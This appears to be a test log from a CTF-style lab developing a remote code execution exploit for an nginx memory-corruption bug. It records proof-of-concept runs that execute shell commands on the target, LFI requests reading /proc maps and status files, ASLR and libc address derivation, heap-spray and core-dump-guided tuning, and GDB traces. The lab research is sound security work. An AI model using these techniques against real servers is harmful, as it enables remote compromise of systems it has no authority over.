# Nginx Rift CTF Tests

Last updated: 2026-05-15 00:58:38 CEST

## Baseline: Original PoC Command Execution

Purpose: prove the known-good PoC still performs command execution in the original lab, not just worker crashes.

Commands:

```bash
docker compose -f env/docker-compose.yml up -d --build --force-recreate
./poc.py --host 127.0.0.1 --port 19321 --cmd 'echo rift-default-ok > /tmp/rift_default_marker'
docker compose -f env/docker-compose.yml exec -T nginx sh -lc 'ls -l /tmp/rift_default_marker && cat /tmp/rift_default_marker'
```

Observed:

```text
[+] try 1/10 crashed - system("echo rift-default-ok > /tmp/rift_default_marker") executed
-rw-r--r-- 1 nobody nogroup ... /tmp/rift_default_marker
rift-default-ok
```

Status: pass.

## Same-Port LFI: PHP Process Identity

Purpose: confirm the PHP LFI primitive runs as the same non-root UID expected for nginx workers.

Command:

```bash
curl -sS 'http://127.0.0.1:19321/lfi.php?file=/proc/self/status' | sed -n '1,12p'
```

Observed:

```text
Name: php-fpm8.1
Uid: 65534 65534 65534 65534
Gid: 65534 65534 65534 65534
```

Status: pass.

## Same-Port LFI: Worker Discovery

Purpose: discover nginx worker PID without Docker introspection.

Commands:

```bash
curl -sS 'http://127.0.0.1:19321/lfi.php?file=/app/tmp/nginx.pid'
curl -sS 'http://127.0.0.1:19321/lfi.php?file=/proc/7/task/7/children'
curl -sS 'http://127.0.0.1:19321/lfi.php?file=/proc/<candidate>/status'
```

Observed in current same-port run:

```text
/app/tmp/nginx.pid: 7
/proc/7/task/7/children: 9 14
nginx worker UID: 65534
```

Status: pass.

## Same-Port LFI: Nginx Worker Maps

Purpose: verify PHP LFI can read the target nginx worker memory map.

Command:

```bash
curl -sS 'http://127.0.0.1:19321/lfi.php?file=/proc/<nginx-worker>/maps' | grep -E '/nginx$|libc\.so|\[heap\]'
```

Observed:

```text
555555554000-555555576000 r--p ... /nginx-src/build/nginx
555555659000-55555566f000 rw-p ... /nginx-src/build/nginx
7ffffefc0000-7ffffefe8000 r--p ... /usr/lib/x86_64-linux-gnu/libc.so.6
```

Status: pass.

## Remote-Only Driver: Map And Libc Derivation

Purpose: derive ASLR-sensitive target facts through HTTP-only primitives.

Command:

```bash
./ctf_remote_exploit.py --host 127.0.0.1 --port 19321 --tries-per-candidate 10 --verbose
```

Observed:

```text
Nginx worker PID discovered over LFI
Nginx writable image mapping: 0x555555659000
libc base/path from worker maps: 0x7ffffefc0000 /usr/lib/x86_64-linux-gnu/libc.so.6
system() offset from LFI-read libc ELF: 0x50d70
system() absolute address: 0x7fffff010d70
URI-safe candidate cleanup addresses: 5 / 20
```

Result: no marker proof. Attempts caused worker disruption only.

Status: partial pass. Address derivation works; exploitation proof has not landed in same-port CTF mode.

## Next Test: Same-Port Core-Guided Mode

Purpose: evaluate whether an LFI-readable core dump can recover the actual sprayed payload address remotely.

Command:

```bash
./ctf_remote_exploit.py --host 127.0.0.1 --port 19321 --core-guided --tries-per-candidate 10 --verbose
```

Expected pass condition:

```text
[+] CTF win: marker /tmp/nginx_rift_ctf_<id> contains token ...
```

Observed:

```text
Core-guided URI-safe spray addresses: 2
Trying core-derived spray address 0x5555556b3477
Trying core-derived spray address 0x555555754a77
Core-guided candidates did not produce proof.
```

Status: failed proof, but passed core-read and spray-address-discovery subtests.

## Same-Port Core-Guided Mode With Post-Read Worker Reset

Purpose: determine whether same-port LFI core extraction perturbs the worker heap before the final exploit attempts.

Command:

```bash
./ctf_remote_exploit.py --host 127.0.0.1 --port 19321 --core-guided --tries-per-candidate 10 --verbose
```

Observed:

```text
Resetting nginx worker after LFI core read to restore a clean heap state
Trying core-derived spray address 0x5555556b3477
Trying core-derived spray address 0x555555754a77
Core-guided candidates did not produce proof.
```

Status: failed proof. Worker reset did not improve the result.

## Vagrant ESXi Launch

Purpose: create a real x86_64 Ubuntu lab VM on the `Ultra` ESXi host.

Commands:

```bash
vagrant validate
vagrant up --provider=vmware_esxi
```

Observed:

```text
root@ultra.home SSH key auth works.
ovftool still requires ESXi password auth for upload/import.
VMID: 24
VM IP: 192.168.1.205
Direct Vagrant-key SSH to vagrant@192.168.1.205 works.
```

Status: partial pass. VM creation succeeded; provider guest communication did not complete, so provisioning was completed by rsync plus direct SSH.

## Vagrant x86_64 Same-Port Smoke Test

Purpose: remove Docker Desktop amd64 emulation from the lab while preserving the x86_64 target architecture.

Commands:

```bash
vagrant up --provider=vmware_esxi
curl -sS http://192.168.1.205:19321/
curl -sS 'http://192.168.1.205:19321/lfi.php?file=/proc/self/status' | sed -n '1,20p'
curl -sS 'http://192.168.1.205:19321/lfi.php?file=/proc/sys/kernel/randomize_va_space'
```

Observed:

```text
HTTP /: ok
php-fpm8.1 UID/GID: 65534/65534
randomize_va_space: 2
uname -m: x86_64
nginx-rift/php8.1-fpm/nginx-rift-backend: active
```

Status: pass.

## Vagrant x86_64 Remote Driver Discovery

Purpose: confirm the HTTP-only driver can derive target facts on a real x86_64 Ubuntu VM with ASLR enabled.

Command:

```bash
./ctf_remote_exploit.py --host 192.168.1.205 --port 19321 --tries-per-candidate 1 --proof-delay 0.2 --verbose
```

Observed:

```text
Nginx worker PID discovered over LFI: 11975
Nginx writable image mapping: 0x55dd1b08e000
libc base/path from worker maps: 0x7fc69afa8000 /usr/lib/x86_64-linux-gnu/libc.so.6
system() offset from LFI-read libc ELF: 0x50d70
system() absolute address: 0x7fc69aff8d70
URI-safe candidate cleanup addresses: 0 / 20
```

Status: pass for remote derivation, fail for legacy candidate availability in that ASLR layout.

## Vagrant x86_64 ASLR Candidate Sampling

Purpose: measure whether fresh nginx master ASLR layouts commonly produce URI-safe legacy cleanup candidates.

Method:

```text
For each sample:
1. restart nginx-rift as lab control,
2. run ctf_remote_exploit.py --derive-only --no-phpinfo,
3. record the nginx writable image mapping, libc base, heap ranges, and URI-safe candidate count.
```

Observed:

```text
sample=1  safe=0 rw=0x55c59b3ce000 libc=0x7f9652d66000
sample=2  safe=0 rw=0x55ab22265000 libc=0x7f7682d00000
sample=3  safe=0 rw=0x55e693dbc000 libc=0x7fb8a9d1d000
sample=4  safe=0 rw=0x555da1ccc000 libc=0x7fdb37b78000
sample=5  safe=0 rw=0x55a02cf5a000 libc=0x7f0f73ff6000
sample=6  safe=0 rw=0x5559cdd81000 libc=0x7fd4560a1000
sample=7  safe=0 rw=0x55cbe7f0e000 libc=0x7f54a9800000
sample=8  safe=0 rw=0x558fd8411000 libc=0x7f0e8d491000
sample=9  safe=0 rw=0x5559c6dfa000 libc=0x7f94c2e3b000
sample=10 safe=0 rw=0x56040dbbe000 libc=0x7f1e99cad000
sample=11 safe=0 rw=0x5558fcaae000 libc=0x7fcfedaaf000
sample=12 safe=0 rw=0x55e899590000 libc=0x7fc750ce4000
```

Status: pass. Empirical result so far is `0 / 12` fresh master layouts with any URI-safe legacy candidate.

## Vagrant x86_64 Core-Guided Mode

Purpose: test whether LFI-readable core dumps can recover usable sprayed fake-structure addresses on the real VM.

Setup fixes:

```text
kernel.core_pattern=core
kernel.core_uses_pid=0
fs.suid_dumpable=2
apport disabled
/app/tmp owned by nobody:nogroup
```

Command:

```bash
./ctf_remote_exploit.py --host 192.168.1.205 --port 19321 --core-guided --tries-per-candidate 2 --proof-delay 0.25 --verbose
```

Observed:

```text
Nginx writable image mapping: 0x55d483d21000
libc base/path from worker maps: 0x7f0bb665f000 /usr/lib/x86_64-linux-gnu/libc.so.6
URI-safe candidate cleanup addresses: 0 / 20
No legacy URI-safe candidates; using safe bogus probe address 0x303030303030 to generate a core
Core-guided sprayed-body addresses: 0 URI-safe / 20 total
unsafe core hit: 0x55d484df7477
unsafe core hit: 0x55d484dfdeb7
...
```

Status: partial pass. The VM produces LFI-readable cores and the driver recovers sprayed fake-structure addresses, but this ASLR layout produced no URI-safe target address and therefore no CTF marker proof.

## Debug Twin: GDB Trace Geometry

Purpose: use the non-target clone VM to explain why partial-overwrite parameter sweeps stop short of the victim cleanup pointer.

Setup:

```text
debug/twin VM: 192.168.1.89:19321
target VM:     192.168.1.205:19321
gdb:           allowed only on the debug/twin
```

Trace script:

```bash
sudo gdb -q -p $(pgrep -n nginx) -x /vagrant/debug/gdb_trace_request.gdb -ex continue
```

Observed:

```text
COPY_CAPTURE prints the vulnerable copy destination and request pool.
CLEANUP_ADD prints the upload victim cleanup allocation.
POOL_DESTROY shows whether the corrupted pool cleanup pointer is reached.
Default geometry lands thousands of bytes before the cleanup slot.
connection_pool_size=1456 plus an 11-byte set-prefix reaches a 69-byte near miss.
One more padding step crosses an allocation threshold and loses the target geometry.
```

Status: pass for diagnosis, fail for exploit proof.

## Core Slot Scan

Purpose: recover many possible fake-cleanup structure addresses from the sprayed POST body, instead of only checking offset zero.

Command shape:

```bash
./ctf_remote_exploit.py \
  --host <vm-ip> --port 19321 \
  --core-guided --target-len <2|3|6> \
  --upload-victim --a-count 128 --plus-count 2800 \
  --verbose
```

Observed on the debug/twin:

```text
target-len=6: 0 URI-safe / thousands total
target-len=3: 0 URI-safe / thousands total
target-len=2: hundreds URI-safe / thousands total
```

Status: partial pass. Slot discovery works, but trying low-byte-safe slots without matching the victim cleanup pointer high bytes did not produce marker proof.

## Core Slot Cleanup-Window Filter

Purpose: avoid trying arbitrary low-2-byte-safe sprayed slots that cannot be reached by a partial overwrite of the victim cleanup pointer.

Command:

```bash
./ctf_remote_exploit.py \
  --host 192.168.1.89 --port 19321 \
  --core-guided --target-len 2 \
  --upload-victim --a-count 349 --plus-count 2600 \
  --tries-per-candidate 1 --max-core-hits 20 --verbose
```

Observed:

```text
Core slot candidates: 737 URI-safe / 9940 total
Cleanup-window filter: 4 plausible pools, 0 with probe low bytes, 125 matching safe slots
No cleanup pointer with probe low bytes was found.
First 20 filtered attempts: worker disruption, no marker proof.
```

Status: failed proof, useful negative signal. The core does not show evidence that the overwrite reached `pool->cleanup`.

## Delayed Victim Body

Purpose: test whether the overflow can corrupt victim request/pool metadata first, then let the later upload body register cleanup in the corrupted state.

Command:

```bash
./ctf_remote_exploit.py \
  --host 192.168.1.89 --port 19321 \
  --core-guided --target-len 2 \
  --upload-victim --delay-victim-body \
  --a-count 128 --plus-count 2800 \
  --tries-per-candidate 1 --max-core-hits 30 --verbose
```

Observed on tuned debug config:

```text
Core slot candidates: 940 URI-safe / 9940 total
Cleanup-window filter: 2 plausible pools, 0 with probe low bytes, 0 matching safe slots
gdb: SIGSEGV in ngx_http_request_handler() immediately after COPY_CAPTURE.
```

Status: failed proof. Delaying the body does not help while the overflow crashes the worker before cleanup allocation.
